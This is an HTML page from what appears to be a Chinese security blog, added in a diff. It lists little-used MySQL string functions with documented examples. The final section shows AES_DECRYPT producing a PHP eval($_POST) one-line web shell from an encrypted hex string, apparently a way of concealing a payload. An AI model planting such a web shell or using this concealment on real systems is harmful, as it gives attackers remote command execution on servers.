@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>MySQL生僻函数总结</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <p>本文记录一些MySQL生僻函数</p>
+<ul>
+<li>目录
+{:toc}</li>
+</ul>
+<h2 id="0x01-字符串函数">0X01 字符串函数</h2>
+<h3 id="strcmp">STRCMP</h3>
+<p><strong>STRCMP(expr1,expr2)</strong></p>
+<p>STRCMP() returns 0 if the strings are the same, -1 if the first argument is smaller than the second according to the current sort order, and 1 otherwise.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT STRCMP<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;text&#39;</span>, <span style="color:#e6db74">&#39;text2&#39;</span><span style="color:#f92672">)</span>;
+-&gt; -1
+mysql&gt; SELECT STRCMP<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;text2&#39;</span>, <span style="color:#e6db74">&#39;text&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#ae81ff">1</span>
+mysql&gt; SELECT STRCMP<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;text&#39;</span>, <span style="color:#e6db74">&#39;text&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#ae81ff">0</span>
+mysql&gt; SET @s1 <span style="color:#f92672">=</span> _latin1 <span style="color:#e6db74">&#39;x&#39;</span> COLLATE latin1_general_ci;
+mysql&gt; SET @s2 <span style="color:#f92672">=</span> _latin1 <span style="color:#e6db74">&#39;X&#39;</span> COLLATE latin1_general_ci;
+mysql&gt; SET @s3 <span style="color:#f92672">=</span> _latin1 <span style="color:#e6db74">&#39;x&#39;</span> COLLATE latin1_general_cs;
+mysql&gt; SET @s4 <span style="color:#f92672">=</span> _latin1 <span style="color:#e6db74">&#39;X&#39;</span> COLLATE latin1_general_cs;
+mysql&gt; SELECT STRCMP<span style="color:#f92672">(</span>@s1, @s2<span style="color:#f92672">)</span>, STRCMP<span style="color:#f92672">(</span>@s3, @s4<span style="color:#f92672">)</span>;
++------------------+------------------+
+| STRCMP<span style="color:#f92672">(</span>@s1, @s2<span style="color:#f92672">)</span> | STRCMP<span style="color:#f92672">(</span>@s3, @s4<span style="color:#f92672">)</span> |
++------------------+------------------+
+|<span style="color:#ae81ff">0</span>                 |<span style="color:#ae81ff">1</span>                 |
++------------------+------------------+
+</code></pre></div><h3 id="regexp">REGEXP</h3>
+<p><strong>expr REGEXP pat, expr RLIKE pat</strong></p>
+<p>Regular expression operations use the character set and collation of the string expression and pattern arguments when deciding the type of a character and performing the comparison. If the arguments have different character sets or collations, coercibility rules apply as described in Section 10.8.4, “Collation Coercibility in Expressions”.</p>
+<p>If either argument is a binary string, the arguments are handled in case-sensitive fashion as binary strings.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT <span style="color:#e6db74">&#39;Michael!&#39;</span> REGEXP <span style="color:#e6db74">&#39;.*&#39;</span>;
++------------------------+
+| <span style="color:#e6db74">&#39;Michael!&#39;</span> REGEXP <span style="color:#e6db74">&#39;.*&#39;</span> |
++------------------------+
+|<span style="color:#ae81ff">1</span>                       |
++------------------------+
+mysql&gt; SELECT <span style="color:#e6db74">&#39;new*\n*line&#39;</span> REGEXP <span style="color:#e6db74">&#39;new\\*.\\*line&#39;</span>;
++---------------------------------------+
+| <span style="color:#e6db74">&#39;new*\n*line&#39;</span> REGEXP <span style="color:#e6db74">&#39;new\\*.\\*line&#39;</span> |
++---------------------------------------+
+|                                     <span style="color:#ae81ff">0</span> |
++---------------------------------------+
+mysql&gt; SELECT <span style="color:#e6db74">&#39;a&#39;</span> REGEXP <span style="color:#e6db74">&#39;^[a-d]&#39;</span>;
++---------------------+
+| <span style="color:#e6db74">&#39;a&#39;</span> REGEXP <span style="color:#e6db74">&#39;^[a-d]&#39;</span> |
++---------------------+
+|                   <span style="color:#ae81ff">1</span> |
++---------------------+
+mysql&gt; SELECT <span style="color:#e6db74">&#39;fo\nfo&#39;</span> REGEXP <span style="color:#e6db74">&#39;^fo$&#39;</span>;
+-&gt; <span style="color:#ae81ff">0</span>
+mysql&gt; SELECT <span style="color:#e6db74">&#39;fofo&#39;</span> REGEXP <span style="color:#e6db74">&#39;^fo&#39;</span>;
+-&gt; <span style="color:#ae81ff">1</span>
+mysql&gt; SELECT <span style="color:#e6db74">&#39;fo\no&#39;</span> REGEXP <span style="color:#e6db74">&#39;^fo\no$&#39;</span>;
+-&gt; <span style="color:#ae81ff">1</span>
+mysql&gt; SELECT <span style="color:#e6db74">&#39;fo\no&#39;</span> REGEXP <span style="color:#e6db74">&#39;^fo$&#39;</span>;
+-&gt; <span style="color:#ae81ff">0</span>
+mysql&gt; SELECT <span style="color:#e6db74">&#39;fofo&#39;</span> REGEXP <span style="color:#e6db74">&#39;^f.*$&#39;</span>;
+-&gt; <span style="color:#ae81ff">1</span>
+mysql&gt; SELECT <span style="color:#e6db74">&#39;fo\r\nfo&#39;</span> REGEXP <span style="color:#e6db74">&#39;^f.*$&#39;</span>;
+-&gt; <span style="color:#ae81ff">1</span>
+mysql&gt; SELECT <span style="color:#e6db74">&#39;Ban&#39;</span> REGEXP <span style="color:#e6db74">&#39;^Ba*n&#39;</span>;
+-&gt; <span style="color:#ae81ff">1</span>
+mysql&gt; SELECT <span style="color:#e6db74">&#39;Baaan&#39;</span> REGEXP <span style="color:#e6db74">&#39;^Ba*n&#39;</span>;
+-&gt; <span style="color:#ae81ff">1</span>
+mysql&gt; SELECT <span style="color:#e6db74">&#39;Bn&#39;</span> REGEXP <span style="color:#e6db74">&#39;^Ba*n&#39;</span>;
+-&gt; <span style="color:#ae81ff">1</span>
+</code></pre></div><h3 id="upper">UPPER</h3>
+<p><strong>UPPER(str)</strong></p>
+<p>Returns the string str with all characters changed to uppercase according to the current character set mapping. The default is latin1 (cp1252 West European).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT UPPER<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Hej&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;HEJ&#39;</span>
+</code></pre></div><h3 id="lower">LOWER</h3>
+<p><strong>LOWER(str)</strong></p>
+<p>Returns the string str with all characters changed to lowercase according to the current character set mapping. The default is latin1 (cp1252 West European).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT LOWER<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;QUADRATICALLY&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;quadratically&#39;</span>
+</code></pre></div><h3 id="lpad">LPAD</h3>
+<p><strong>LPAD(str,len,padstr)</strong></p>
+<p>Returns the string str, left-padded with the string padstr to a length of len characters. If str is longer than len, the return value is shortened to len characters.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+mysql&gt; SELECT LPAD<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;hi&#39;</span>,4,<span style="color:#e6db74">&#39;??&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;??hi&#39;</span>
+mysql&gt; SELECT LPAD<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;hi&#39;</span>,1,<span style="color:#e6db74">&#39;??&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;h&#39;</span>
+</code></pre></div><h3 id="ltrim">LTRIM</h3>
+<p><strong>LTRIM(str)</strong></p>
+<p>Returns the string str with leading space characters removed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT LTRIM<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;
+</span><span style="color:#e6db74">-&gt; &#39;</span>barbar<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</code></pre></div><h3 id="make_set">MAKE_SET</h3>
+<p><strong>MAKE_SET(bits,str1,str2,&hellip;)</strong></p>
+<p>Returns a set value (a string containing substrings separated by , characters) consisting of the strings that have the corresponding bit in bits set. str1 corresponds to bit 0, str2 to bit 1, and soon. NULL values in str1, str2, &hellip; are not appended to the result.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT MAKE_SET<span style="color:#f92672">(</span>1,<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;a&#39;</span>
+mysql&gt; SELECT MAKE_SET<span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> | 4,<span style="color:#e6db74">&#39;hello&#39;</span>,<span style="color:#e6db74">&#39;nice&#39;</span>,<span style="color:#e6db74">&#39;world&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;hello,world&#39;</span>
+mysql&gt; SELECT MAKE_SET<span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> | 4,<span style="color:#e6db74">&#39;hello&#39;</span>,<span style="color:#e6db74">&#39;nice&#39;</span>,NULL,<span style="color:#e6db74">&#39;world&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;hello&#39;</span>
+mysql&gt; SELECT MAKE_SET<span style="color:#f92672">(</span>0,<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;&#39;</span>
+</code></pre></div><h3 id="octet_length">OCTET_LENGTH</h3>
+<p><strong>OCTET_LENGTH(str)</strong></p>
+<p>OCTET_LENGTH() is a synonym for LENGTH().</p>
+<p>Returns the length of the string str, measured in bytes. A multibyte character counts as multiple bytes. This means that for a string containing five 2-byte characters, LENGTH() returns 10, whereas CHAR_LENGTH() returns 5.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT LENGTH<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;text&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#ae81ff">4</span>
+</code></pre></div><h3 id="locate">LOCATE</h3>
+<p><strong>LOCATE(substr,str), LOCATE(substr,str,pos)</strong></p>
+<p>The first syntax returns the position of the first occurrence of substring substr in string str. The second syntax returns the position of the first occurrence of substring substr in string str, starting at position pos. Returns 0 if substr is not in str. Returns NULL if substr or str is NULL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT LOCATE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;bar&#39;</span>, <span style="color:#e6db74">&#39;foobarbar&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#ae81ff">4</span>
+mysql&gt; SELECT LOCATE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;xbar&#39;</span>, <span style="color:#e6db74">&#39;foobar&#39;</span><span style="color:#f92672">)</span>;
+-&gt; <span style="color:#ae81ff">0</span>
+mysql&gt; SELECT LOCATE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;bar&#39;</span>, <span style="color:#e6db74">&#39;foobarbar&#39;</span>, 5<span style="color:#f92672">)</span>;
+-&gt; <span style="color:#ae81ff">7</span>
+</code></pre></div><h3 id="mid-substring">MID SUBSTRING</h3>
+<p><strong>MID(str,pos,len)</strong></p>
+<p>MID(str,pos,len) is a synonym for SUBSTRING(str,pos,len).</p>
+<p><strong>SUBSTRING</strong></p>
+<ul>
+<li>SUBSTRING(str,pos), SUBSTRING(str FROM pos)</li>
+<li>SUBSTRING(str,pos,len),</li>
+<li>SUBSTRING(str FROM pos FOR len)</li>
+</ul>
+<p>The forms without a len argument return a substring from string str starting at position pos.
+The forms with a len argument return a substring len characters long from string str, starting at position pos. The forms that use FROM are standard SQL syntax.</p>
+<p>It is also possible to use a negative value for pos. In this case, the beginning of the substring is pos characters from the end of the string, rather than the beginning. A negative value may be used for pos in any of the forms of this function.</p>
+<p>For all forms of SUBSTRING(), the position of the first character in the string from which the substring is to be extracted is reckoned as 1.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT SUBSTRING<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Quadratically&#39;</span>,5<span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;ratically&#39;</span>
+mysql&gt; SELECT SUBSTRING<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;foobarbar&#39;</span> FROM 4<span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;barbar&#39;</span>
+mysql&gt; SELECT SUBSTRING<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Quadratically&#39;</span>,5,6<span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;ratica&#39;</span>
+mysql&gt; SELECT SUBSTRING<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Sakila&#39;</span>, -3<span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;ila&#39;</span>
+mysql&gt; SELECT SUBSTRING<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Sakila&#39;</span>, -5, 3<span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;aki&#39;</span>
+mysql&gt; SELECT SUBSTRING<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Sakila&#39;</span> FROM -4 FOR 2<span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;ki&#39;</span>
+</code></pre></div><h3 id="substring_index">SUBSTRING_INDEX</h3>
+<p><strong>SUBSTRING_INDEX(str,delim,count)</strong></p>
+<p>Returns the substring from string str before count occurrences of the delimiter delim. If count is positive, everything to the left of the final delimiter (counting from the left) is returned. If count is negative, everything to the right of the final delimiter (counting from the right) is returned.
+SUBSTRING_INDEX() performs a case-sensitive match when searching for delim.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT SUBSTRING_INDEX<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;www.mysql.com&#39;</span>, <span style="color:#e6db74">&#39;.&#39;</span>, 2<span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;www.mysql&#39;</span>
+mysql&gt; SELECT SUBSTRING_INDEX<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;www.mysql.com&#39;</span>, <span style="color:#e6db74">&#39;.&#39;</span>, -2<span style="color:#f92672">)</span>;
+-&gt; <span style="color:#e6db74">&#39;mysql.com&#39;</span>
+</code></pre></div><h3 id="to_base64">TO_BASE64</h3>
+<p><strong>TO_BASE64(str)</strong></p>
+<p>Converts the string argument to base-64 encoded form and returns the result as a character string with the connection character set and collation. If the argument is not a string, it is converted to a string before conversion takes place. The result is NULL if the argument is NULL. Base-64 encoded strings can be decoded using the FROM_BASE64() function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT TO_BASE64<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;abc&#39;</span><span style="color:#f92672">)</span>, FROM_BASE64<span style="color:#f92672">(</span>TO_BASE64<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;abc&#39;</span><span style="color:#f92672">))</span>;
+-&gt; <span style="color:#e6db74">&#39;JWJj&#39;</span>, <span style="color:#e6db74">&#39;abc&#39;</span>
+</code></pre></div><h3 id="from_base64">FROM_BASE64</h3>
+<p>Takes a string encoded with the base-64 encoded rules used by TO_BASE64() and returns the
+decoded result as a binary string. The result is NULL if the argument is NULL or not a valid base-64 string. See the description of TO_BASE64() for details about the encoding and decoding rules.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql&gt; SELECT TO_BASE64<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;abc&#39;</span><span style="color:#f92672">)</span>, FROM_BASE64<span style="color:#f92672">(</span>TO_BASE64<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;abc&#39;</span><span style="color:#f92672">))</span>;
+-&gt; <span style="color:#e6db74">&#39;JWJj&#39;</span>, <span style="color:#e6db74">&#39;abc&#39;</span>
+</code></pre></div><h2 id="0x02-加密">0x02 加密</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt; SELECT AES_DECRYPT<span style="color:#f92672">(</span>UNHEX<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;4B8A46D45BFA21AB2301907A63E868E3293216683CF8FF8A08A4C96986627A59&#34;</span><span style="color:#f92672">)</span>,<span style="color:#e6db74">&#34;PASS&#34;</span><span style="color:#f92672">)</span>;
++-----------------------------------------------------------------------------------------------+
+| AES_DECRYPT<span style="color:#f92672">(</span>UNHEX<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;4B8A46D45BFA21AB2301907A63E868E3293216683CF8FF8A08A4C96986627A59&#34;</span><span style="color:#f92672">)</span>,<span style="color:#e6db74">&#34;PASS&#34;</span><span style="color:#f92672">)</span> |
++-----------------------------------------------------------------------------------------------+
+| &lt;?php eval<span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;cmd&#34;</span><span style="color:#f92672">])</span>;?&gt;                                                                  |
++-----------------------------------------------------------------------------------------------+
+<span style="color:#ae81ff">1</span> row in set <span style="color:#f92672">(</span>0.00 sec<span style="color:#f92672">)</span>
+</code></pre></div>
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
